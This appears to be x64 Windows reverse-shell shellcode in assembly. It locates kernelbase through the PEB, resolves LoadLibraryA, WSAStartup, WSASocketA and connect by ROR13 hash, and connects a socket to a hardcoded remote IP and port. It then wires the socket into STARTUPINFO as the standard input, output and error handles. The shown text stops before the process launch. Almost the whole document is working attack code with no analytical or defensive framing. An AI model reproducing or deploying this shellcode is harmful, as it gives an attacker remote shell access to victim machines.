start:

find_kernelbase:
mov rcx, 60h				# RCX = 0x60
mov r8, gs:[rcx]			# R8 = ptr to PEB ([GS:0x60])
mov rdi, [r8 + 18h]			# RDI = PEB->Ldr
mov rdi, [rdi + 30h]		# RDI = PEB->Ldr->InLoadInitOrder
xor rcx, rcx 				# RCX = 0
mov dl, 4bh					# DL = "K"

next_module:				
mov rax, [rdi+10h]			# RAX = InInitOrder[X].base_address
mov rsi, [rdi+40h]			# RSI = InInitOrder[X].module_name
mov rdi, [rdi]				# RDI = InInitOrder[X].flink (next)
cmp [rsi+12*2], cx 			# (unicode) modulename[12] == 0x00 ?
jne next_module 			# No: try next module
cmp [rsi], dl 				# modulename starts with "K"
jne next_module 			# No: try next module
jmp locate_funcs 			# Skip to main shellcode

lookup_func: 
mov ebx, [rdi + 3ch]		# Offset to PE Signature VMA
add rbx, 88h 				# Export table relative offset 
add rbx, rdi 				# Export table VMA
mov eax, [rbx] 				# Export directory relative offset
mov rbx, rdi 				
add rbx, rax 				# Export directory VMA
mov eax, [rbx + 20h] 		# AddressOfNames relative offset
mov r8, rdi 				
add r8, rax 				# AddressOfNAmes VMA
mov ecx, [rbx + 18h] 		# NumberOfNames

check_names: 				
jecxz found_func			# End of exported list
dec ecx 					# Search backwards through the exported functions
mov eax, [r8 + rcx * 4] 	# Store the relative offset of the name
mov rsi, rdi 				
add rsi, rax 				# Set RSI to the VMA of the current name
xor r9, r9 					# R9 = 0
xor rax, rax 				# RAX = 0
cld 						# Clear direction

calc_hash: 	
lodsb 						# Load the next byte from RSI into AL
test al, al 				# Test ourselves
jz calc_finished 			# If the ZF is set,we've hit the null term
ror r9d, 0dh 				# Rotate R9D 13 bits to the right
add r9, rax 				# Add the new byte to the accumulator
jmp calc_hash 				# Next iteration

calc_finished: 				 
cmp r9d, edx 				# Compare the computed hash with the requested hash
jnz check_names 			# No match, try the next one

find_addr: 				
mov r8d, [rbx + 24h] 		# Ordinals table relative offset
add r8, rdi 				# Ordinals table VMA
xor rax, rax 				# RAX = 0
mov ax, [r8 + rcx * 2] 		# Extrapolate the function's ordinal
mov r8d, [rbx + 1ch] 		# Address table relative offset
add r8, rdi 				# Address table VMA
mov eax, [r8 + rax * 4] 	# Extract the relative function offset from its ordinal
add rax, rdi 				# Function VMA

found_func: 				
ret 					

locate_funcs: 				
mov rdi, rax 				# Store moduleBase
sub rsp, 8
mov r15, rsp 				# Stack pointer for storage

locate_loadlibrarya:
mov edx, 0ec0e4e8eh
call lookup_func
mov [r15+80h], rax

call_loadlibrarya:
mov rcx, 642e32335f327377h
mov [r15+100h], rcx
mov rcx, 6c6ch
mov [r15+108h], rcx
lea rcx, [r15+100h]
mov rax, [r15+80h]
call rax
mov rdi, rax

locate_wsastartup:
mov edx, 3bfcedcbh
call lookup_func
mov [r15+98h], rax

locate_wsasocketa:
mov edx, 0adf509d9h		
call lookup_func
mov [r15+0a0h], rax

locate_connect:
mov edx, 060aaf9ech
call lookup_func
mov [r15+0a8h], rax

call_wsastartup:
mov rcx, 202h
lea rdx, [r15+200h]
mov rax, [r15+98h]
call rax

call_wsasocketa:
mov ecx, 2
mov edx, 1
mov r8, 6
xor r9, r9
mov [rsp+20h], r9
mov [rsp+28h], r9
mov rax, [r15+0a0h]
call rax
mov rsi, rax

call_connect:
mov rcx, rax
mov r8, 10h
lea rdx, [r15+220h]
mov r9, 097fba8c05c110002h # fix with correct IP
mov [rdx], r9
xor r9, r9
mov [rdx+8], r9
mov rax, [r15+0a8h]
call rax

setup_si_and_pi:
mov rdi, r15                # lpProcessInformation and lpStartupInfo 
add rdi, 300h               #
mov rbx, rdi                #
xor eax, eax                #
mov ecx, 20h                #
rep stosd                   # Zero 0x80 bytes
mov eax, 68h                # lpStartupInfo.cb = sizeof(lpStartupInfo)
mov [rbx], eax              #
mov eax, 100h				# STARTF_USESTDHANDLES
mov [rbx+3ch], eax 			# lpStartupInfo.dwFlags
mov [rbx+50h], rsi 			# lpStartupInfo.hStdInput = socket handle
mov [rbx+58h], rsi 			# lpStartupInfo.hStdOutput = socket handle
mov [rbx+60h], rsi 			# lpStartupInfo.hStdError = socket handle